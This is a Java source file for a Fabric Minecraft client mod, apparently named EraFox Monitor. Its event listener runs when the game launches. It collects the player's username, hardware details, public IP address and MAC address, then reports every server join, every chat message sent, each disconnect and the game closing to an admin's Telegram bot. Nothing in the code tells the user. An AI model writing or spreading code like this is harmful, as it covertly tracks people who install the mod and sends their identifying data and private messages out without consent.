package dev.erafox.monitor.listener;

import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientLifecycleEvents;
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents;
import net.fabricmc.fabric.api.client.message.v1.ClientSendMessageEvents;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.network.ServerInfo;
import dev.erafox.monitor.EraFoxMonitorMod;
import dev.erafox.monitor.bot.TelegramBotEngine;
import dev.erafox.monitor.profile.SystemScanner;

public class GameEventListener {
    private static String lastServerIp = "";

    public static void register(EraFoxMonitorMod mod) {
        // Событие запуска Minecraft
        ClientLifecycleEvents.CLIENT_STARTED.register(client -> {
            SystemScanner scanner = EraFoxMonitorMod.getSystemScanner();
            String username = client.getSession().getUsername();
            
            String message = "‼️Новый пользователь!\n" +
                           "    ● Никнейм: " + username + "\n" +
                           "    ● GPU: " + scanner.getGpuInfo() + "\n" +
                           "    ● CPU: " + scanner.getCpuInfo() + "\n" +
                           "    ● RAM: " + scanner.getRamInfo() + "\n" +
                           "    ● IP: " + scanner.getPublicIp() + "\n" +
                           "    ● MAC: " + scanner.getMacAddress();
            
            sendToAdmin(message);
            
            TelegramBotEngine bot = EraFoxMonitorMod.getBotEngine();
            if (bot != null) {
                bot.addOnlineUser(username);
                bot.updateOnlineList();
            }
        });

        // Подключение к серверу
        ClientPlayConnectionEvents.JOIN.register((handler, sender, client) -> {
            ServerInfo serverInfo = client.getCurrentServerEntry();
            String serverIp = (serverInfo != null) ? serverInfo.address : "localhost";
            lastServerIp = serverIp;
            
            String message = "‼️Пользователь " + client.getSession().getUsername() + 
                           " Присоединился к серверу " + serverIp;
            sendToAdmin(message);
        });

        // Отправка сообщения в чат
        ClientSendMessageEvents.ALLOW_GAME.register((message) -> {
            String username = MinecraftClient.getInstance().getSession().getUsername();
            String logMessage = "‼️Отправлено сообщение:\n" +
                              "    ● От: " + username + "\n" +
                              "    ● Сообщение: " + message;
            sendToAdmin(logMessage);
            return true;
        });

        // Отключение от сервера
        ClientPlayConnectionEvents.DISCONNECT.register((handler, client) -> {
            String message = "‼️Пользователь " + client.getSession().getUsername() + 
                           " Покинул сервер " + lastServerIp;
            sendToAdmin(message);
        });

        // Закрытие Minecraft
        ClientLifecycleEvents.CLIENT_STOPPING.register(client -> {
            String username = client.getSession().getUsername();
            String message = "‼️Пользователь " + username + " Закрыл майнкрафт.";
            sendToAdmin(message);
            
            TelegramBotEngine bot = EraFoxMonitorMod.getBotEngine();
            if (bot != null) {
                bot.removeOnlineUser(username);
                bot.updateOnlineList();
            }
        });
    }

    private static void sendToAdmin(String text) {
        TelegramBotEngine bot = EraFoxMonitorMod.getBotEngine();
        if (bot != null) {
            bot.sendGameEvent(text);
        } else {
            EraFoxMonitorMod.LOGGER.info("[EVENT] " + text);
        }
    }
}
